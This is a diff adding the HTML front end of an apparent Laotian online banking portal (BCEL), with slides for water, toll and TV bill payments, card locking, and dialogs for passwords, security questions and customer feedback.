+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="water3">
+      <h1 data-name="Water Payment Confirmation">
+       Water Payment Confirmation
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Province:
+        </th>
+        <td>
+         <span class="wpprovince">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Code:
+        </th>
+        <td>
+         <span class="wpusercode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Name:
+        </th>
+        <td>
+         <span class="wpusername">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Bill Date:
+        </th>
+        <td>
+         <span class="wpbilldate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         <span class="wpbalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="wpbalance">
+         </span>
+         <span class="wpcurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="wpaccount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <span class="wpamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="waterbutton4">
+        Pay
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="water4">
+      <h1 data-name="Water Payment Completed">
+       Water Payment Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+       You have completed the water payment
+       <br/>
+       Province:
+       <span class="bold wpprovince">
+       </span>
+       <br/>
+       Water User Code:
+       <span class="bold wpusercode">
+       </span>
+       <br/>
+       Water User Name:
+       <span class="bold wpusername">
+       </span>
+       <br/>
+       <tr>
+        <th>
+         Bill Date:
+        </th>
+        <td>
+         <span class="bold wpbilldate">
+         </span>
+        </td>
+       </tr>
+       Amount:
+       <span class="bold wpamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### WATER #################################### -->
+     <div class="slide" id="water">
+      <h1 data-name="Water Payment">
+       Water Payment
+      </h1>
+      <p>
+       <img src="https://bcel.la:8083/img/waterbill.png"/>
+      </p>
+      <div class="narrowmargin">
+       <h2>
+        Province:
+       </h2>
+       <p>
+        <select class="provinces" id="wpprovince">
+        </select>
+       </p>
+       <h2>
+        Water User Code:
+       </h2>
+       <input id="wpusercode" name="customercode" placeholder="Water User Code" type="text"/>
+       <button class="gray" id="wrecent" style="padding: 0.2em 0.3em !important" type="button">
+        <img src="https://bcel.la:8083/img/icon-down.png"/>
+       </button>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="waterbutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="water2">
+      <h1 data-name="Water Payment">
+       Water Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Province:
+        </th>
+        <td>
+         <span class="wpprovince">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Code:
+        </th>
+        <td>
+         <span class="wpusercode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Name:
+        </th>
+        <td>
+         <span class="wpusername">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         <span class="wpbalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="wpbalance">
+         </span>
+         <span class="wpcurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <select class="accounts" id="wpaccount">
+         </select>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <input class="small" id="wpamount" type="text"/>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="waterbutton3">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="water3">
+      <h1 data-name="Water Payment Confirmation">
+       Water Payment Confirmation
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Province:
+        </th>
+        <td>
+         <span class="wpprovince">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Code:
+        </th>
+        <td>
+         <span class="wpusercode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Water User Name:
+        </th>
+        <td>
+         <span class="wpusername">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         <span class="wpbalancename">
+         </span>
+         :
+        </th>
+        <td>
+         <span class="wpbalance">
+         </span>
+         <span class="wpcurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="wpaccount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <span class="wpamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="waterbutton4">
+        Pay
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="water4">
+      <h1 data-name="Water Payment Completed">
+       Water Payment Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+       You have completed the water payment
+       <br/>
+       Province:
+       <span class="bold wpprovince">
+       </span>
+       <br/>
+       Water User Code:
+       <span class="bold wpusercode">
+       </span>
+       <br/>
+       Water User Name:
+       <span class="bold wpusername">
+       </span>
+       <br/>
+       Amount:
+       <span class="bold wpamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### TK #################################### -->
+     <div class="slide" id="tk">
+      <h1 data-name="Mittaphap Toll Payment">
+       Mittaphap Toll Payment
+      </h1>
+      <p>
+       <img src="https://bcel.la:8083/img/tksample.jpg"/>
+      </p>
+      <div class="narrowmargin">
+       <h2>
+        Barcode:
+       </h2>
+       <input id="tkbarcode" name="tkbarcode" placeholder="Barcode" type="text"/>
+       <button class="gray" id="tkrecent" style="padding: 0.2em 0.3em !important" type="button">
+        <img src="https://bcel.la:8083/img/icon-down.png"/>
+       </button>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="tkbutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="tk2">
+      <h1 data-name="Mittaphap Toll Payment">
+       Mittaphap Toll Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Barcode:
+        </th>
+        <td>
+         <span class="tkbarcode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         NT:cardbalance:
+        </th>
+        <td>
+         <span class="tkbalance">
+         </span>
+         <span class="tkcurrency">
+          Kip
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <select class="accounts" id="tkaccount">
+         </select>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <input class="small" id="tkamount" type="text"/>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="tkbutton3">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="tk3">
+      <h1 data-name="Mittaphap Toll Payment Confirmation">
+       Mittaphap Toll Payment Confirmation
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Barcode:
+        </th>
+        <td>
+         <span class="tkbarcode">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         NT:cardbalance:
+        </th>
+        <td>
+         <span class="tkbalance">
+          <span class="tkcurrency">
+           Kip
+          </span>
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="tkaccount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       Amount to pay:
+      </p>
+      <p class="largetext">
+       <span class="tkamount">
+       </span>
+       Kip
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="tkbutton4">
+        Pay
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="tk4">
+      <h1 data-name="Mittaphap Toll Payment Completed">
+       Mittaphap Toll Payment Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+       <table class="keyvalue">
+        <tr>
+         <th>
+          Barcode:
+         </th>
+         <td>
+          <span class="tkbarcode">
+          </span>
+         </td>
+        </tr>
+        <tr>
+         <th>
+          Amount:
+         </th>
+         <td>
+          <span class="tkamount">
+          </span>
+          Kip
+         </td>
+        </tr>
+       </table>
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### LDTV #################################### -->
+     <div class="slide" id="ldtv">
+      <h1 data-name="LDTV">
+       LDTV
+      </h1>
+      <p>
+       <img src="https://bcel.la:8083/img/ldtvcard.jpg"/>
+      </p>
+      <div class="narrowmargin">
+       <h2>
+        Card Number:
+       </h2>
+       <input id="ldcard" name="ldcard" placeholder="Card Number" type="text"/>
+       <button class="gray" id="ldrecent" style="padding: 0.2em 0.3em !important" type="button">
+        <img src="https://bcel.la:8083/img/icon-down.png"/>
+       </button>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="ldtvbutton2">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="ldtv2">
+      <h1 data-name="LDTV Payment">
+       LDTV Payment
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Card Number:
+        </th>
+        <td>
+         <span class="ldcard">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Name:
+        </th>
+        <td>
+         <span class="ldname">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Due Date:
+        </th>
+        <td>
+         <span class="ldduedate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <select class="accounts" id="ldaccount">
+         </select>
+        </td>
+       </tr>
+      </table>
+      <div class="ldchoices">
+       <div class="ldchoice year1 selected">
+       </div>
+       <div class="ldchoice year2">
+       </div>
+      </div>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="ldtvbutton3">
+        Continue
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="ldtv3">
+      <h1 data-name="Payment Confirmation">
+       Payment Confirmation
+      </h1>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Card Number:
+        </th>
+        <td>
+         <span class="ldcard">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Name:
+        </th>
+        <td>
+         <span class="ldname">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Due Date:
+        </th>
+        <td>
+         <span class="ldduedate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Duration:
+        </th>
+        <td>
+         <span class="ldduration">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="accounts">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="ldtvbutton4">
+        Pay
+        <img src="https://bcel.la:8083/img/icon-yes.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="ldtv4">
+      <h1 data-name="LDTV Payment Completed">
+       LDTV Payment Completed
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+      </p>
+      <table class="keyvalue">
+       <tr>
+        <th>
+         Card Number:
+        </th>
+        <td>
+         <span class="ldcard">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Name:
+        </th>
+        <td>
+         <span class="ldname">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Due Date:
+        </th>
+        <td>
+         <span class="ldduedate">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Duration:
+        </th>
+        <td>
+         <span class="ldduration">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <span class="ldaccount">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Amount:
+        </th>
+        <td>
+         <span class="ldamount">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <!-- #################################### BILLING HISTORY #################################### -->
+     <div class="slide" id="history">
+      <h1 data-name="Billing History">
+       Billing History
+      </h1>
+      <table id="historytable">
+       <thead>
+        <tr>
+         <th>
+          Month
+         </th>
+         <th>
+          Electricity
+         </th>
+         <th>
+          Water
+         </th>
+         <th>
+          Phone
+         </th>
+        </tr>
+       </thead>
+       <tbody>
+       </tbody>
+      </table>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+      </p>
+     </div>
+     <!-- #################################### LOCK CARD #################################### -->
+     <div class="slide" id="lockcard">
+      <h1 data-name="Lock Card">
+       <span class="lockunlocktitle">
+        Lock Card
+       </span>
+      </h1>
+      <p class="error cannotunlockmessage">
+       Card locked by BCEL, cannot be unlocked by user
+      </p>
+      <p class="lockmessage unlockmessage">
+       Are you sure you want to
+       <span class="lockunlock">
+        lock
+       </span>
+       this card:
+      </p>
+      <p class="lockcardnumber">
+      </p>
+      <p class="error lockmessage">
+       Warning: You will not be able to use your card with ATMs, shops, or online after the card has been locked.
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="lockcardbutton0" onclick="openSlide('lockcard2')">
+        <span class="lockunlocktitle">
+         Lock Card
+        </span>
+        <img src="https://bcel.la:8083/img/icon-right.png"/>
+       </button>
+      </p>
+     </div>
+     <div class="slide" id="lockcard2">
+      <h1 data-name="Lock Card">
+       <span class="lockunlocktitle">
+        Lock Card
+       </span>
+       Confirmation
+      </h1>
+      <p class="lockmessage unlockmessage">
+       Confirmation to
+       <span class="lockunlock">
+        lock
+       </span>
+       this card:
+      </p>
+      <p class="lockcardnumber">
+      </p>
+      <p class="error lockmessage">
+       Please click "
+       <span class="lockunlocktitle">
+        Lock Card
+       </span>
+       " button to confirm.
+      </p>
+      <p>
+       <button class="backbutton" onclick="backOneSlide()">
+        <img src="https://bcel.la:8083/img/icon-left.png"/>
+        Back
+       </button>
+       <button id="lockcardbutton2">
+        <span class="lockunlocktitle">
+         Lock Card
+        </span>
+        <img class="lockunlockimg" src="https://bcel.la:8083/img/icon-no.png"/>
+       </button>
+      </p>
+      <p class="errormessage">
+      </p>
+     </div>
+     <div class="slide" id="lockcard3">
+      <h1 data-name="Lock Card">
+       Card
+       <span class="lockedunlocked">
+        Locked
+       </span>
+      </h1>
+      <p>
+       <img alt="Success" src="https://bcel.la:8083/img/success.png"/>
+       <br/>
+       <p>
+        Card
+        <span class="lockcardnumber">
+        </span>
+        has been successfully
+        <span class="lockedunlocked">
+         Locked
+        </span>
+       </p>
+      </p>
+      <p>
+       <button class="homebutton">
+        <img src="https://bcel.la:8083/img/icon-home.png"/>
+        Back to Home
+       </button>
+      </p>
+     </div>
+    </div>
+   </div>
+  </div>
+  <!-- #################################### DIALOG #################################### -->
+  <div class="qrscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h2 id="qraccount">
+    </h2>
+    <div id="qrcode">
+    </div>
+    <button class="closedialog" type="button">
+     Close
+    </button>
+   </div>
+  </div>
+  <div class="addphonescreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <form id="apform">
+     <h1>
+      Show name and balance
+     </h1>
+     <div class="padding">
+      <h3 class="cpsubtitle">
+       Enter the phone number's current "total" balance to prove the ownership (check total balance by sending de to 133)
+      </h3>
+      <table class="detailtable">
+       <tr>
+        <th>
+         Phone Number:
+        </th>
+        <td>
+         <span id="apphone">
+         </span>
+         <span class="error apphone">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Current Total Debt:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="apbalance" required="" type="text"/>
+         </p>
+         <span class="error apbalance">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p class="aperror error">
+      </p>
+     </div>
+     <div class="buttonbox">
+      <button class="closedialog" id="apcancel" type="button">
+       Cancel
+      </button>
+      <button id="apsave" type="submit">
+       Save
+      </button>
+      <p class="cpwait" style="display: none">
+       Please wait...
+      </p>
+     </div>
+    </form>
+   </div>
+  </div>
+  <div class="changepasswordscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <form id="cpform">
+     <h1>
+      Change Password
+     </h1>
+     <div class="padding">
+      <h3 class="cpsubtitle" style="display: none">
+       Please change password to continue
+      </h3>
+      <table class="detailtable">
+       <tr>
+        <th>
+         Old Password:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="cpold" type="password"/>
+         </p>
+         <span class="error cpold">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         New Password:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="cpnew" type="password"/>
+         </p>
+         <span class="error cpnew">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Confirm Password
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="cpconfirm" type="password"/>
+         </p>
+         <span class="error cpconfirm">
+         </span>
+        </td>
+       </tr>
+      </table>
+      <p class="notice">
+       Password must be at least 6 characters, contains lowercase, uppercase, and number
+      </p>
+     </div>
+     <div class="buttonbox">
+      <button class="closedialog gray" id="cpcancel" type="button">
+       Cancel
+      </button>
+      <button id="cpsave" type="submit">
+       Save
+      </button>
+      <p class="cpwait" style="display: none">
+       Please wait...
+      </p>
+     </div>
+    </form>
+   </div>
+  </div>
+  <div class="changequestionscreen screen force" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <form id="cqform">
+     <h1>
+      Security Question Setup
+     </h1>
+     <h3 class="cqsubtitle">
+      Please answer the questions below in order to complete the registration
+     </h3>
+     <p class="cqloading">
+      Loading…...
+     </p>
+     <div class="cqtable padding" style="display:none">
+      <table>
+       <tr>
+        <th>
+         Question 1:
+        </th>
+        <td>
+         <select id="cqquestion1" required="">
+         </select>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Answer 1:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="cqanswer1" required="" type="password"/>
+         </p>
+        </td>
+       </tr>
+       <tr>
+        <th class="padtop">
+         Question 2:
+        </th>
+        <td class="padtop">
+         <select id="cqquestion2" required="">
+         </select>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Answer 2:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="cqanswer2" required="" type="password"/>
+         </p>
+        </td>
+       </tr>
+       <tr>
+        <th class="padtop">
+         Question 3:
+        </th>
+        <td class="padtop">
+         <select id="cqquestion3" required="">
+         </select>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Answer 3:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="cqanswer3" required="" type="password"/>
+         </p>
+        </td>
+       </tr>
+      </table>
+      <p class="notice">
+       All answers must be numerical only
+      </p>
+      <p class="cqerror error">
+      </p>
+     </div>
+     <div class="buttonbox">
+      <button id="cqsave" type="submit">
+       Save
+      </button>
+      <p class="cqwait" style="display: none">
+       Please wait...
+      </p>
+     </div>
+    </form>
+   </div>
+  </div>
+  <div class="addaccountscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <form id="aaform">
+     <h1>
+      Add Account
+     </h1>
+     <h3 class="aasubtitle">
+      Please answer the questions below in order to complete the registration
+     </h3>
+     <p class="aaloading">
+      Please wait...
+     </p>
+     <div class="aatable padding" style="display:none">
+      <table>
+       <tr>
+        <th>
+         Account:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="aaaccount" required="" type="text"/>
+         </p>
+        </td>
+       </tr>
+       <tr>
+        <th class="padtop">
+         Question 1:
+        </th>
+        <td class="padtop">
+         <span class="aaquestion1">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Answer 1:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="aaanswer1" required="" type="password"/>
+         </p>
+        </td>
+       </tr>
+       <tr>
+        <th class="padtop">
+         Question 2:
+        </th>
+        <td class="padtop">
+         <span class="aaquestion2">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Answer 2:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="aaanswer2" required="" type="password"/>
+         </p>
+        </td>
+       </tr>
+       <tr>
+        <th class="padtop">
+         Question 3:
+        </th>
+        <td class="padtop">
+         <span class="aaquestion3">
+         </span>
+        </td>
+       </tr>
+       <tr>
+        <th>
+         Answer 3:
+        </th>
+        <td>
+         <p class="negateinput">
+          <input id="aaanswer3" required="" type="password"/>
+         </p>
+        </td>
+       </tr>
+      </table>
+      <p class="notice">
+       All answers must be numerical only
+      </p>
+      <p class="aaerror error">
+      </p>
+     </div>
+     <div class="buttonbox">
+      <button class="closedialog gray" id="aacancel" type="button">
+       Cancel
+      </button>
+      <button id="aasave" type="submit">
+       Save
+      </button>
+      <p class="aawait" style="display: none">
+       Please wait...
+      </p>
+     </div>
+    </form>
+   </div>
+  </div>
+  <div class="transferaccountscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Destination Accounts
+    </h1>
+    <form id="taform">
+     <p class="negateinput">
+      <input id="tasearch" placeholder="Search" type="text"/>
+     </p>
+    </form>
+    <table class="taccounts listing">
+    </table>
+   </div>
+  </div>
+  <div class="precentscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Recent Phones
+    </h1>
+    <table class="pcustomercodes listing">
+    </table>
+   </div>
+  </div>
+  <div class="erecentscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Recent Payments
+    </h1>
+    <table class="ecustomercodes listing">
+    </table>
+   </div>
+  </div>
+  <div class="wrecentscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Recent Payments
+    </h1>
+    <table class="wcustomercodes listing">
+    </table>
+   </div>
+  </div>
+  <div class="iframescreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Dialog
+    </h1>
+    <div class="framebox">
+     <iframe>
+     </iframe>
+    </div>
+    <div class="buttonbox">
+     <button class="closedialog gray" type="button">
+      Close
+     </button>
+    </div>
+   </div>
+  </div>
+  <div class="messagescreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Message
+    </h1>
+    <div class="messagelist">
+    </div>
+    <div class="messagedetail">
+     <table class="detailtable">
+      <tr>
+       <th>
+        Title:
+       </th>
+       <td class="messagetitle">
+       </td>
+      </tr>
+      <tr>
+       <th>
+        Source:
+       </th>
+       <td class="messagesource">
+       </td>
+      </tr>
+      <tr>
+       <th>
+        Time:
+       </th>
+       <td class="messagetime">
+       </td>
+      </tr>
+     </table>
+     <hr/>
+     <div class="messagebody">
+     </div>
+    </div>
+    <div class="loading">
+    </div>
+    <div class="buttonbox">
+     <button class="closedialog gray" type="button">
+      Close
+     </button>
+    </div>
+   </div>
+  </div>
+  <div class="feedbackscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     Feedback
+    </h1>
+    <div class="threads">
+    </div>
+    <div class="posts">
+     <div class="chattitle">
+     </div>
+     <div class="chatlist">
+     </div>
+     <div class="chatbox">
+      <div class="messagebox">
+       <textarea id="message"></textarea>
+      </div>
+      <button id="sendbutton">
+       Send
+      </button>
+     </div>
+     <div class="loadinginner" style="display: none">
+     </div>
+    </div>
+    <div class="loading" style="display: none">
+    </div>
+    <div class="buttonbox">
+     <button class="closedialog gray" type="button">
+      Close
+     </button>
+     <button id="newfeedbackbutton" type="button">
+      New Feedback
+     </button>
+    </div>
+   </div>
+  </div>
+  <div class="newfeedbackscreen screen" style="display: none">
+   <div class="mask">
+   </div>
+   <div class="dialog">
+    <h1>
+     New Feedback
+    </h1>
+    <h3>
+     Post your question or problem here and BCEL staff will promptly help you
+    </h3>
+    <div class="nftable padding">
+     <table>
+      <tr>
+       <th>
+        Title:
+       </th>
+       <td>
+        <p class="negateinput">
+         <input id="nftitle" required="" type="text"/>
+        </p>
+       </td>
+      </tr>
+      <tr>
+       <th>
+        Description:
+       </th>
+       <td>
+        <textarea id="nfdescription" required=""></textarea>
+       </td>
+      </tr>
+     </table>
+     <p class="nferror error">
+     </p>
+    </div>
+    <div class="buttonbox">
+     <button class="closedialog gray" id="nfcancel" type="button">
+      Cancel
+     </button>
+     <button id="nfsend" type="button">
+      Send
+     </button>
+     <p class="pleasewait" style="display: none">
+      Please wait...
+     </p>
+    </div>
+    <div class="loading" style="display: none">
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
